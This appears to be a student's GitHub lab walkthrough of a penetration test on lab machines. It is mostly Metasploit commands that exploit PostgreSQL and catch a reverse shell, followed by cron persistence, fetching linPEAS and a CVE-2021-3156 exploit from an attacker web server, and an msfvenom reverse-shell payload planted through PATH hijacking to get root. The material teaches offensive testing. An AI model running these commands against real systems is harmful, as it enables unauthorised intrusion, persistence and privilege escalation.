# METASPLOIT

## Introduction


Metasploit and Proxychains are essential tools for cybersecurity professionals conducting penetration tests. Metasploit helps find vulnerabilities using its search feature or the broader SearchSploit on Kali Linux. Proxychains enhances anonymity and security by routing Metasploit's traffic through proxies, avoiding direct detection. This combination allows for effective and discreet security assessments.

## Section 1: HOW TO CATCH USER PERSISTENCE SHELL ON VIC2 

 [1:45:23] Day 11

### (ATTACKER) ON msf6

Use whatever number that has the most recent date for exploit module.

```bash
search postgresql
```

Based off the server data in (ATTACKER) (TERM 2) we saw that PostgreSQL is 9.6.0

```
search postgresql 9.6.0
```

Start from 9.6.0 and back space one character each time to see what you find out

```
search postgresql 9.6
```

```
search postgresql 9.
```

```
search postgresql 9
```

Use number that has expliot module (it vaires but i used the one ending in "cmd_excec")
use exploit modules as much as possible.
1. LHOST (istening) comming back through our WAN
2. RHOST (recieving)

## Section 2: CONFIGURING YOUR EXPLOIT MODULE 

[1:48] DAY 11

### (KALI)

```
searchsploit postgresql
```

(Find version)

### (ATTACKER) ON msf6

```
search postgresql
```

Exploit Module looks something like this make sure you use the number that the has the most recent date: `exploit(multi/postgress/postgress_copy_from_program_cmd_exec)`

[3:29] DAY 11

```
set lhost 192.168.122.209 
```

```
set rhosts 192.168.1.102
```

**Use your own port**

```
set lport 61775
```


Use your manual port for reverse shells

```
show options
```

```
run
```

Should get exploit here

[3:30] DAY 11

```
Id
```



![image](https://github.com/sannicJP/Pen-Test-LAB/assets/161343927/4647cade-3673-4514-8728-895a4fdf8d11)

### (VICTIM)






![image](https://github.com/sannicJP/Pen-Test-LAB/assets/161343927/555ad47a-e318-4c77-b1da-49c36ad32519)
![image](https://github.com/sannicJP/Pen-Test-LAB/assets/161343927/cc75956e-935c-49cc-ba10-5bf0a780b058)
Break out metasploit by using your FIRST port you made creating 
another shell open listener on your (DEFAULT PORT) and on the victim paste in the rev shells syntax. when you catch the shell just press enter then /bin/bash.

```
/bin/bash
```

number you want to use for VIC2 persistence

#### (THIS PORT NUMBER IS ONLY FOR SOC4 PERSISTENCE)
Create a crontab using python3 shortest with your port 
![image](https://github.com/sannicJP/Pen-Test-LAB/assets/161343927/4b84efee-c919-4598-9442-c27375f08abb)

## Section 3: PRIV ESC ON SOC4

Set up another listner over DEFAULT port  (VIC 2 Persisitence)

[14:02] DAY 12


### (ATTACKER)

```
nc -lvp 55557 
```
[NEW PORT I SET VIC ON PFSENSE]

### (ATTACKER) (NEW TERM)

```
cd internal
```

```
cd 192.168.1.102
```

```
curl -L http://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh 
```
[1:33] DAY 12

```
curl -L http://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | tee linpeas.sh
```

```
ls 
```

This is a automation script that we will move to the victim this info could be found on hacktricks
**Checklist Linux Privesc escalation LinPEAS**

```
cat linpeas.sh| less
```

**(CHECK THEN EXIT)**

```
ls
```

```
python3 -m http.server 8000
```

**THIS LETS YOU HOST A WEBSERVER WITH PYTHON**


**Set up another port fowarding rule with this port number because thats where the websever is.**

#### Type in web browser

```
127.0.0.1:8000
```

**Were going to download linPEAS to ourselves (ATTACKER) and then access it through the 
web server from the victim side. Basically hosting linPeas utulizing python throwing it
up on a webpage and the downloading it from victim.**

### (VICTIM)

```
wget http://192.168.122.209:8000/linpeas.sh
```

**(I WENT TO THE WEBPAGE AND CLICKED THE _linpeas.sh_ LINK)**

```
ls
```

```
mv linpeas.sh /tmp
```

```
cd /tmp
```

```
ls
```

```
chmod u+x linpeas.sh
```

```
ls -al
```

**(capture everything you run in TERMINAL)**

`(ctl a + H)`


```
./linpeas.sh 
```

```
watch ls -l
```

### (ATTACKER)

**(Close Capture)**

`(ctl a + H)`

[2:21:33]
Trying out exploit  [CVE-2018-18955] subuid_shell

```
ls
```

```
mv screenlog.0 linpeas_output
```

```
mv linpeas_output ./Desktop/pentest/internal/192.168.1.102
```

This might not be your file path so just make sure its in "internal"


`cd [your path to verify]`


```
cat linpeas_output| less -r
```

```
cd ./Desktop/pentest/internal/192.168.1.102
```

```
ls
```

```
wget https://codeload.github.com/worawit/CVE-2021-3156/zip/main
```

```
file main
```

```
unzip main
```

```
ls
```

```
cd CVE-2021-3156-main
```

```
cat readme
```

 [2:12:27]
 
## Section 4: Exploiting arper utilizing msfvenom as a reverse shell

[3:25:45]
![image](https://github.com/sannicJP/Pen-Test-LAB/assets/161343927/1a7d5b6e-dc59-4b1d-bac5-b5b1e7ac049c)
### (ATTACKER) 
```
msfvenom -p linux/x64/shell/reverse_tcp LHOST=192.168.122.209
```

```
ls 
```

```
sudo rm -r __MAC0SX
```

```
file mal
```
![image](https://github.com/sannicJP/Pen-Test-LAB/assets/161343927/88dadbc3-7f9b-4f49-be04-8eeef1d50722)

```
python3 -m http.server 8000
```
![image](https://github.com/sannicJP/Pen-Test-LAB/assets/161343927/f69be757-f20c-4bfc-89d2-e38541188b0d)

## Root

### (VICTIM) 


```
cd /tmp
```

```
wget http://192.168.122.209:8000/mal
```

```
ls
```

```
ls -al
```

```
mv mal clear
```
(Malicious binary is known as clear)

```
ls
```

```
echo $PATH
```

[3:29]

```
export PATH=/tmp:$PATH
```

```
echo $PATH
```

```
chmod u+x clear
```

```
ls -al | grep clear
```

```
./clear
```

Open mfsconsole

### (ATACKER) (msf6) 

```
search multi handler
```

Use 5 or exploit/multi/handler

```
set lhost 192.168.122.209
```

```
set lport 61775
```

```
show payload
```


```
set payload linux/x64/shell/reverse_tcp
```

```
show options 
```
(To see if payload is set properly)


```
run
```

### (VICTIM)
![image](https://github.com/sannicJP/Pen-Test-LAB/assets/161343927/1cd2315e-e9c8-4360-b280-9b31903f7eb3)
```
chmod u+x clear
```

```
./clear
```

```
ls -la | grep clear
```

```
echo $PATH
```

```
arper
```

If this does not clear the screen reverse shell worked.


![image](https://github.com/sannicJP/Pen-Test-LAB/assets/161343927/e9abdcc8-781a-4376-9ac3-a402e609ee37)
## **Go back and check if command shell opened then run...**

```
id
```
![image](https://github.com/sannicJP/Pen-Test-LAB/assets/161343927/058ede3d-686f-4ad2-9822-59a43b095c87)





## Thank you! To github.com/carlospolop
